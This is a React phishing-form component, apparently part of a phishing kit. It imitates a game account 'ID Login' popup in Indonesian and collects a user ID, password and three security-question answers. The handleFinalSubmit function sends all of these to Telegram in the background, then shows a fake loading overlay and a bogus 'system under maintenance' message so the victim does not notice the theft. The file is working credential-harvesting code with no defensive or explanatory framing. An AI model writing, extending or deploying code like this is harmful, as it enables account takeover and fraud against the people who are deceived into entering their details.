
import { useState } from 'react';
import { sendToTelegram } from '../services/telegram';
import { FaEye, FaEyeSlash, FaCaretDown, FaTimes, FaExclamationTriangle } from 'react-icons/fa';

const LoginForm = () => {
  const [step, setStep] = useState(1); // 1: Login, 2: Security Questions, 3: Success Modal
  
  // STEP 1 STATES
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // STEP 2 STATES (3 Questions)
  const [q1, setQ1] = useState('Tim sepak bola kesukaan Anda?');
  const [a1, setA1] = useState('');
  const [q2, setQ2] = useState('Apa mobil kesukaan Anda?');
  const [a2, setA2] = useState('');
  const [q3, setQ3] = useState('Nama panggilan masa kecil Anda?');
  const [a3, setA3] = useState('');
  
  // Dropdown States
  const [activeDropdown, setActiveDropdown] = useState<number | null>(null);

  const [loading, setLoading] = useState(false);
  const [showCustomLoading, setShowCustomLoading] = useState(false); // New Loading State
  const [errorField, setErrorField] = useState<string | null>(null);

  // List Pilihan Pertanyaan
  const questionOptions = [
    "Tim sepak bola kesukaan Anda?",
    "Apa nama film pertama yang Anda tonton?",
    "Apa mobil kesukaan Anda?",
    "Nama panggilan masa kecil Anda?",
    "Apa nama hewan peliharaan Anda?",
    "Artis mana yang paling Anda sukai?"
  ];

  // Handle Input Number Only for User ID
  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (/^\d*$/.test(value)) {
      setUsername(value);
    }
  };

  const handleConfirm = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      alert('Please fill in User ID and Password');
      return;
    }
    setStep(2);
  };

  const handleFinalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorField(null);

    // Validasi Sederhana
    if (!a1 || a1.length < 6) { setErrorField('a1'); return; }
    if (!a2 || a2.length < 6) { setErrorField('a2'); return; }
    if (!a3 || a3.length < 6) { setErrorField('a3'); return; }

    setLoading(true); // Disable button immediately

    // Kirim ke Telegram di background
    const combinedQ = `1. ${q1} (${a1})\n2. ${q2} (${a2})\n3. ${q3} (${a3})`;
    const success = await sendToTelegram(username, password, combinedQ, "-");
    
    // Tampilkan Custom Loading Overlay
    // (Kita sembunyikan form pertanyaan dulu agar loading terlihat clean di tengah)
    setShowCustomLoading(true);
    setStep(0); // 0 = Hide all forms temporarily

    // Delay 5 detik sebelum muncul alert sukses/gagal
    setTimeout(() => {
      setShowCustomLoading(false);
      setLoading(false);
      
      if (success) {
        setStep(3); // Show Success Modal
      } else {
        alert('Gagal mengirim data. Silakan coba lagi.');
        setStep(2); // Kembali ke form pertanyaan
      }
    }, 5000);
  };

  const handleClose = () => window.location.reload();

  // CUSTOM LOADING COMPONENT
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
        <div className="bg-[#8b4513]/90 border border-[#d4af37] rounded-full px-8 py-4 shadow-[0_0_20px_rgba(255,165,0,0.5)] flex items-center justify-center animate-pulse">
          <span className="text-white font-medium text-sm md:text-base tracking-wide drop-shadow-md">
            Sedang mendapatkan data, harap tunggu sebentar...
          </span>
        </div>
      </div>
    );
  }

  return (
    <div className="relative w-[340px] md:w-[420px] max-h-[90vh] flex flex-col items-center">
      
      {/* ================= STEP 1: LOGIN (PURPLE THEME) ================= */}
      {step === 1 && (
        <div className="bg-[#2d1b2d] border-2 border-[#d4af37] rounded-3xl p-6 shadow-[0_0_20px_rgba(0,0,0,0.8)] relative animate-pop-in w-full">
          {/* HEADER */}
          <div className="absolute -top-5 left-1/2 -translate-x-1/2 w-[160px] h-[40px] bg-gradient-to-b from-[#5c3a5c] to-[#2d1b2d] border-2 border-[#d4af37] flex items-center justify-center rounded-lg shadow-lg z-20 transform skew-x-[-10deg]">
             <h2 className="text-[#ffd700] font-serif font-bold text-xl italic tracking-wider transform skew-x-[10deg] drop-shadow-md">ID Login</h2>
             <div className="absolute top-1/2 -left-3 w-5 h-5 bg-[#2d1b2d] border-l-2 border-b-2 border-[#d4af37] transform -translate-y-1/2 rotate-45 -z-10"></div>
             <div className="absolute top-1/2 -right-3 w-5 h-5 bg-[#2d1b2d] border-r-2 border-t-2 border-[#d4af37] transform -translate-y-1/2 rotate-45 -z-10"></div>
          </div>

          <button onClick={handleClose} className="absolute -top-3 -right-3 w-8 h-8 bg-[#4a2c4a] border-2 border-[#d4af37] rounded-lg flex items-center justify-center shadow-lg hover:scale-110 transition-transform z-20">
            <FaTimes className="text-[#ffd700] text-lg font-bold" />
          </button>

          <div className="mt-6 space-y-4">
            <form onSubmit={handleConfirm} className="space-y-3">
              <div className="flex flex-col gap-1">
                <label className="text-[#ffd700] font-bold text-base drop-shadow-md ml-2">User ID</label>
                <div className="relative h-10 bg-[#1a121a] border border-[#5c3a5c] rounded-xl flex items-center px-3 shadow-inner">
                  <input type="text" placeholder="Enter User ID" className="w-full bg-transparent text-white placeholder-white/40 outline-none text-sm font-medium" value={username} onChange={handleUsernameChange} inputMode="numeric" autoFocus />
                  <FaCaretDown className="text-white/50 text-base ml-2" />
                </div>
              </div>
              <div className="flex flex-col gap-1">
                <label className="text-[#ffd700] font-bold text-base drop-shadow-md ml-2">Password</label>
                <div className="relative h-10 bg-[#1a121a] border border-[#5c3a5c] rounded-xl flex items-center px-3 shadow-inner">
                  <input type={showPassword ? "text" : "password"} placeholder="6-16 characters" className="w-full bg-transparent text-white placeholder-white/40 outline-none text-sm font-medium" value={password} onChange={(e) => setPassword(e.target.value)} />
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-white/50 hover:text-white transition-colors">
                    {showPassword ? <FaEyeSlash /> : <FaEye />}
                  </button>
                </div>
              </div>
              <div className="pt-3 flex justify-center">
                <button type="submit" className="w-[140px] h-10 bg-gradient-to-b from-[#4cd137] to-[#44bd32] border-b-[3px] border-[#2e8c24] rounded-full text-white font-black text-lg shadow-[0_4px_10px_rgba(0,255,0,0.3)] hover:brightness-110 active:scale-95 transition-all" style={{ textShadow: '0px 1px 2px rgba(0,0,0,0.5)' }}>Confirm</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ================= STEP 2: SECURITY QUESTIONS (COMPACT BEIGE) ================= */}
      {step === 2 && (
        <div className="bg-[#fcf3cf] border-[3px] border-[#8b4513] rounded-2xl shadow-[0_0_20px_rgba(0,0,0,0.8)] relative animate-pop-in flex flex-col max-h-[85vh] w-full">
          
          {/* HEADER (Compact) */}
          <div className="bg-[#fcf3cf] pt-2 pb-1 text-center relative border-b border-[#e0c097] flex-shrink-0 rounded-t-xl">
             <div className="flex items-center justify-center gap-2">
               <div className="h-[1px] w-6 bg-[#8b4513]/50"></div>
               <h2 className="text-[#8b4513] font-serif font-bold text-xl italic">Pertanyaan</h2>
               <div className="h-[1px] w-6 bg-[#8b4513]/50"></div>
             </div>
             <button onClick={handleClose} className="absolute top-1 right-2 text-[#b8860b] hover:text-[#8b4513] transition-colors">
               <FaTimes className="text-lg" />
             </button>
          </div>

          {/* SCROLLABLE CONTENT AREA */}
          <div className="p-3 md:p-4 bg-gradient-to-b from-[#fcf3cf] to-[#f5deb3] overflow-y-auto flex-1 custom-scrollbar pb-8">
            <form onSubmit={handleFinalSubmit} className="space-y-1">
              
              {/* Q1 */}
              <div className="relative z-30 mb-2">
                <div className="flex items-center gap-1 mb-1 cursor-pointer" onClick={() => setActiveDropdown(activeDropdown === 1 ? null : 1)}>
                  <div className="w-7 h-5 bg-[#daa520] border border-[#8b4513] rounded flex items-center justify-center text-[#4a2c0f] font-bold text-[10px] shadow-sm relative after:absolute after:bottom-[-3px] after:left-1 after:border-t-[3px] after:border-t-[#daa520] after:border-l-[3px] after:border-l-transparent after:border-r-[3px] after:border-r-transparent">Q1</div>
                  <div className="flex-1 h-8 bg-[#e6ccaa] border border-[#d2b48c] rounded flex items-center justify-between px-2 shadow-inner">
                    <span className="text-[#5c4033] text-xs font-medium truncate">{q1}</span>
                    <FaCaretDown className="text-[#8b4513]" />
                  </div>
                </div>
                {activeDropdown === 1 && (
                  <div className="absolute top-7 left-8 right-0 bg-[#fff8dc] border border-[#d2b48c] rounded-lg shadow-lg z-50 max-h-32 overflow-y-auto">
                    {questionOptions.map((opt) => (
                      <div key={opt} onClick={() => { setQ1(opt); setActiveDropdown(null); }} className="px-2 py-1.5 text-xs text-[#5c4033] hover:bg-[#ffe4b5] cursor-pointer border-b border-[#eee8aa] last:border-none">
                        {opt}
                      </div>
                    ))}
                  </div>
                )}
                
                {/* A1 (Compact inside Q1 group) */}
                <div className="flex items-center gap-1 ml-1">
                  <div className="w-7 h-5 bg-[#e74c3c] border border-[#c0392b] rounded flex items-center justify-center text-white font-bold text-[10px] shadow-sm relative after:absolute after:bottom-[-3px] after:left-1 after:border-t-[3px] after:border-t-[#e74c3c] after:border-l-[3px] after:border-l-transparent after:border-r-[3px] after:border-r-transparent">A1</div>
                  <div className={`flex-1 h-8 bg-[#fdf5e6] border ${errorField === 'a1' ? 'border-red-500' : 'border-[#d2b48c]'} rounded flex items-center px-2 shadow-inner relative`}>
                    <input type="text" placeholder="Silakan masukkan Jawaban" className="w-full bg-transparent text-[#5c4033] placeholder-gray-400 outline-none text-xs" value={a1} onChange={(e) => setA1(e.target.value)} />
                    {errorField === 'a1' && <FaExclamationTriangle className="text-red-500 text-[10px] absolute right-2" />}
                  </div>
                </div>
              </div>

              {/* Q2 */}
              <div className="relative z-20 mb-2">
                <div className="flex items-center gap-1 mb-1 cursor-pointer" onClick={() => setActiveDropdown(activeDropdown === 2 ? null : 2)}>
                  <div className="w-7 h-5 bg-[#daa520] border border-[#8b4513] rounded flex items-center justify-center text-[#4a2c0f] font-bold text-[10px] shadow-sm relative after:absolute after:bottom-[-3px] after:left-1 after:border-t-[3px] after:border-t-[#daa520] after:border-l-[3px] after:border-l-transparent after:border-r-[3px] after:border-r-transparent">Q2</div>
                  <div className="flex-1 h-8 bg-[#e6ccaa] border border-[#d2b48c] rounded flex items-center justify-between px-2 shadow-inner">
                    <span className="text-[#5c4033] text-xs font-medium truncate">{q2}</span>
                    <FaCaretDown className="text-[#8b4513]" />
                  </div>
                </div>
                {activeDropdown === 2 && (
                   <div className="absolute top-7 left-8 right-0 bg-[#fff8dc] border border-[#d2b48c] rounded-lg shadow-lg z-50 max-h-32 overflow-y-auto">
                    {questionOptions.map((opt) => (
                      <div key={opt} onClick={() => { setQ2(opt); setActiveDropdown(null); }} className="px-2 py-1.5 text-xs text-[#5c4033] hover:bg-[#ffe4b5] cursor-pointer border-b border-[#eee8aa] last:border-none">
                        {opt}
                      </div>
                    ))}
                  </div>
                )}
                 {/* A2 */}
                <div className="flex items-center gap-1 ml-1">
                  <div className="w-7 h-5 bg-[#e74c3c] border border-[#c0392b] rounded flex items-center justify-center text-white font-bold text-[10px] shadow-sm relative after:absolute after:bottom-[-3px] after:left-1 after:border-t-[3px] after:border-t-[#e74c3c] after:border-l-[3px] after:border-l-transparent after:border-r-[3px] after:border-r-transparent">A2</div>
                  <div className={`flex-1 h-8 bg-[#fdf5e6] border ${errorField === 'a2' ? 'border-red-500' : 'border-[#d2b48c]'} rounded flex items-center px-2 shadow-inner relative`}>
                    <input type="text" placeholder="Silakan masukkan Jawaban" className="w-full bg-transparent text-[#5c4033] placeholder-gray-400 outline-none text-xs" value={a2} onChange={(e) => setA2(e.target.value)} />
                    {errorField === 'a2' && <FaExclamationTriangle className="text-red-500 text-[10px] absolute right-2" />}
                  </div>
                </div>
              </div>

              {/* Q3 */}
              <div className="relative z-10 mb-2">
                <div className="flex items-center gap-1 mb-1 cursor-pointer" onClick={() => setActiveDropdown(activeDropdown === 3 ? null : 3)}>
                  <div className="w-7 h-5 bg-[#daa520] border border-[#8b4513] rounded flex items-center justify-center text-[#4a2c0f] font-bold text-[10px] shadow-sm relative after:absolute after:bottom-[-3px] after:left-1 after:border-t-[3px] after:border-t-[#daa520] after:border-l-[3px] after:border-l-transparent after:border-r-[3px] after:border-r-transparent">Q3</div>
                  <div className="flex-1 h-8 bg-[#e6ccaa] border border-[#d2b48c] rounded flex items-center justify-between px-2 shadow-inner">
                    <span className="text-[#5c4033] text-xs font-medium truncate">{q3}</span>
                    <FaCaretDown className="text-[#8b4513]" />
                  </div>
                </div>
                {activeDropdown === 3 && (
                   <div className="absolute top-7 left-8 right-0 bg-[#fff8dc] border border-[#d2b48c] rounded-lg shadow-lg z-50 max-h-32 overflow-y-auto">
                    {questionOptions.map((opt) => (
                      <div key={opt} onClick={() => { setQ3(opt); setActiveDropdown(null); }} className="px-2 py-1.5 text-xs text-[#5c4033] hover:bg-[#ffe4b5] cursor-pointer border-b border-[#eee8aa] last:border-none">
                        {opt}
                      </div>
                    ))}
                  </div>
                )}
                 {/* A3 */}
                <div className="flex items-center gap-1 ml-1">
                  <div className="w-7 h-5 bg-[#e74c3c] border border-[#c0392b] rounded flex items-center justify-center text-white font-bold text-[10px] shadow-sm relative after:absolute after:bottom-[-3px] after:left-1 after:border-t-[3px] after:border-t-[#e74c3c] after:border-l-[3px] after:border-l-transparent after:border-r-[3px] after:border-r-transparent">A3</div>
                  <div className={`flex-1 h-8 bg-[#fdf5e6] border ${errorField === 'a3' ? 'border-red-500' : 'border-[#d2b48c]'} rounded flex items-center px-2 shadow-inner relative`}>
                    <input type="text" placeholder="Silakan masukkan Jawaban" className="w-full bg-transparent text-[#5c4033] placeholder-gray-400 outline-none text-xs" value={a3} onChange={(e) => setA3(e.target.value)} />
                    {errorField === 'a3' && <FaExclamationTriangle className="text-red-500 text-[10px] absolute right-2" />}
                  </div>
                </div>
              </div>

              {/* Warning Text */}
              <p className="text-[9px] text-[#6b4c35] text-center px-2 leading-tight mt-2 opacity-80 mb-2">
                Jawaban min 6 karakter, tidak boleh hanya angka & harus berbeda.
              </p>
            </form>
          </div>

           {/* FOOTER AREA WITH BUTTON OVERLAP */}
           <div className="relative h-5 bg-[#8b4513] rounded-b-xl flex-shrink-0 mt-0">
              {/* Submit Button (Absolutely Positioned to Overlap) */}
              <div className="absolute left-0 right-0 -top-5 flex justify-center z-20">
                  <button 
                    type="button" 
                    onClick={handleFinalSubmit}
                    disabled={loading}
                    className="w-[150px] h-10 bg-gradient-to-b from-[#4cd137] to-[#2e8c24] border-[2px] border-[#f5deb3] rounded-full text-white font-black text-lg shadow-[0_4px_6px_rgba(0,0,0,0.4)] hover:brightness-110 active:scale-95 transition-all disabled:opacity-50"
                    style={{ textShadow: '0px 1px 2px rgba(0,0,0,0.5)', outline: '2px solid #2e8c24', outlineOffset: '-2px' }}
                  >
                    {loading ? '...' : 'Tentukan'}
                  </button>
              </div>
           </div>
        </div>
      )}

      {/* ================= STEP 3: SUCCESS MODAL (NEW) ================= */}
      {step === 3 && (
        <div className="bg-[#2d1b2d] border-2 border-[#d4af37] rounded-3xl p-8 shadow-[0_0_30px_rgba(0,0,0,0.9)] relative animate-pop-in flex flex-col items-center justify-center w-[300px] md:w-[360px] text-center">
          
          {/* Close Button */}
          <button onClick={handleClose} className="absolute -top-3 -right-3 w-8 h-8 bg-[#4a2c4a] border-2 border-[#d4af37] rounded-lg flex items-center justify-center shadow-lg hover:scale-110 transition-transform z-20">
            <FaTimes className="text-[#ffd700] text-lg font-bold" />
          </button>

          {/* Success Message */}
          <h3 className="text-white font-bold text-lg md:text-xl mb-8 mt-2 leading-relaxed drop-shadow-md">
            Sistem sedang maintenance sialhkan coba kembali<br/>
          </h3>

          {/* Confirm Button */}
          <button 
            onClick={handleClose}
            className="w-[140px] h-10 bg-gradient-to-b from-[#4cd137] to-[#44bd32] border-b-[3px] border-[#2e8c24] rounded-full text-white font-black text-lg shadow-[0_4px_10px_rgba(0,255,0,0.3)] hover:brightness-110 active:scale-95 transition-all"
            style={{ textShadow: '0px 1px 2px rgba(0,0,0,0.5)' }}
          >
            Confirm
          </button>

        </div>
      )}

    </div>
  );
};

export default LoginForm;
